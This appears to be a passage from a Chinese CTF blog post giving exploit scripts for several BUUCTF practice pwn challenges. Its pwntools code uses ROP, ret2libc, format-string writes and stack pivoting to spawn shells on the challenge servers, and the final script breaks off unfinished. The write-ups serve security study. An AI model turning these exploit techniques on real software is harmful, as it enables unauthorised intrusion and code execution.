<p><img loading="lazy" src="/posts/buu-pwn-0x10-0x1f/image-20210511162201775.png" alt="image-20210511162201775" srcset="/posts/buu-pwn-0x10-0x1f/image-20210511162201775.png?size=small, /posts/buu-pwn-0x10-0x1f/image-20210511162201775.png?size=medium 1.5x, /posts/buu-pwn-0x10-0x1f/image-20210511162201775.png?size=large 2x" data-title="image-20210511162201775" style="--width: 959px;--aspect-ratio: 959 / 387;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>r12是将要执行的地址。</p>
<div class="highlight" id="id-38"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26613</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./ciscn_s_3&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">vulun_addr</span> <span class="o">=</span> <span class="mh">0x4004ED</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_rax</span> <span class="o">=</span> <span class="mh">0x4004E2</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rbx_rbp_r12</span><span class="o">=</span> <span class="mh">0x40059a</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_call</span> <span class="o">=</span> <span class="mh">0x400580</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_call</span> <span class="o">=</span> <span class="mh">0x400517</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x04005a3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vulun_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">bin_sh_add</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span><span class="o">-</span><span class="mh">0x118</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_add</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span>  <span class="n">p64</span><span class="p">(</span><span class="n">mov_call</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">mov_rax</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_add</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys_call</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x19harekazectf2019baby_rop2" class="heading-element">
  <a href="#0x19harekazectf2019baby_rop2" class="heading-mark"></a>0x19.[HarekazeCTF2019]baby_rop2</h3><p>printf泄露地址，ROP构造system /bin/sh。</p>
<div class="highlight" id="id-39"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./babyrop2&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node3.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">26898</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./babyrop2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">printf_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">read_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">fmt_str</span> <span class="o">=</span> <span class="mh">0x00400770</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x0400733</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_r15_ret</span> <span class="o">=</span> <span class="mh">0x400731</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fmt_str</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15_ret</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span>  <span class="n">p64</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;again, &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;again, &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">read_add</span>  <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">read_add</span> <span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="c1">##libc = LibcSearcher(&#39;read&#39;,read_add)</span>
</span></span><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="n">read_add</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system_add</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_add</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x1ajarvisoj_fm" class="heading-element">
  <a href="#0x1ajarvisoj_fm" class="heading-mark"></a>0x1A.jarvisoj_fm</h3><p>格式化字符串。是第11个。</p>
<p>p32(x_addr) + &ldquo;%11$n&rdquo; 意思是将x_addr写入11的位置。</p>
<div class="highlight" id="id-40"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./fm&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node3.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">26157</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">x_addr</span> <span class="o">=</span> <span class="mh">0x0804A02C</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">x_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;%11$n&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x1bjarvisoj_tell_me_something" class="heading-element">
  <a href="#0x1bjarvisoj_tell_me_something" class="heading-mark"></a>0x1B.jarvisoj_tell_me_something</h3><p>简单的ret2text</p>
<div class="highlight" id="id-41"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./guestbook&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fun_add</span> <span class="o">=</span> <span class="mh">0x400620</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fun_add</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x1cjarvisoj_level4" class="heading-element">
  <a href="#0x1cjarvisoj_level4" class="heading-mark"></a>0x1C.jarvisoj_level4</h3><p>ret2libc</p>
<div class="highlight" id="id-42"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./level4&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./level4&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc-2.23.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_add</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">write_add</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="n">write_add</span> <span class="o">-</span> <span class="n">write_got</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_add</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_add</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x1djarvisoj_level3" class="heading-element">
  <a href="#0x1djarvisoj_level3" class="heading-mark"></a>0x1D.jarvisoj_level3</h3><div class="highlight" id="id-43"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">vulnerable_function</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">136</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-88h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;Input:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">7u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><div class="highlight" id="id-44"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./level3&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node3.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">28043</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./level3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc-2.23.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">fun_add</span> <span class="o">=</span> <span class="mh">0x0804844B</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span><span class="s1">&#39;bbbb&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">fun_add</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span>  <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_add</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_add</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Input:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="n">write_add</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_add</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span><span class="s1">&#39;bbbb&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_add</span><span class="p">)</span> <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x10086110</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x1eblack-watch-入群题pwn" class="heading-element">
  <a href="#0x1eblack-watch-%e5%85%a5%e7%be%a4%e9%a2%98pwn" class="heading-mark"></a>0x1E.[Black Watch 入群题]PWN</h3><div class="highlight" id="id-45"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">vul_function</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-18h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">v0</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">m1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">m1</span><span class="p">,</span> <span class="n">v0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mh">0x200u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">m2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">m2</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x20u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>其中s在bss段。</p>
<p>在read buf的位置正好可以覆盖返回地址，覆盖为s的地址，然后在s的地方写入构造好的payload。</p>
<p>s处：</p>
<blockquote>
<p>p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)</p>
</blockquote>
<p>s：<code>0804A300</code></p>
<p>先说下buf处payload的构造：<code>p32(0x18*'a') + p32(s_addr-4)+ p32(leave_ret)</code></p>
<p>ebp指向save_rbp的位置，也就是填入p32(s_addr_4)的位置。然后将返回地址写为leave_ret 的地址。</p>
<p>首先，执行leave_ret(也就是mov rsp,rbp;pop rbp)，会将rsp和rbp通同时指向save_rbp的位置，然后pop rbp，将rbp指向bss段的s_addr-4的位置；再之后rsp再次进行leave_ret，执行完后这时rsp指向bss段s_addr-4的位置，rbp指向s_addr的位置。（pop rbp会将rbp+4）</p>
<div class="highlight" id="id-46"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./spwn&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node3.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">29713</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./spwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc-2.23.so&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x08048408</span>
